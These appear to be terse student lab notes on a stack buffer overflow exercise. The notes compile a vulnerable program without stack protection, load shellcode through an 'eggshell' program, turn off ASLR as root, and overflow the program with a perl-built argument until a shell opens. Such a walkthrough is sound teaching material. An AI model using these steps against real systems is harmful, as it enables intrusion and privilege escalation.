virtual box / ubuntu 32 bit 16.04.05

cpu : 2

mkdir skku_181002

<bugfile>

gcc -o bugfile bugfile.c
./bugfile aaaaaaaaaaaa


why SS??
>> ubuntu os safe
>> compile option add for test

gcc -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -o bugfile bugfile.c 

./bugfile aaaaaaaaaaaa
segmentation fault!!





<eggshell>

gcc -o egg eggshell.c

./egg
>> [using address]

./bugfile `perl -e 'print "a"x12, "using address (little endian type)"'`
>> segmentation fault
>> why fail??
>>> OS Safe (ASLR : Address space layout randomization)


sudo passwd root
PWD

su - root
PWD

Off ASLR 


cat /proc/sys/kernel/randomize_va_space
echo 0 > /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space

ps -ef | grep egg
kill -9 [egg pid]

NEW Terminal

./egg
>> [using address]

./bugfile `perl -e 'print "a"x12, "using address (little endian type)"'`
>> $
>> Success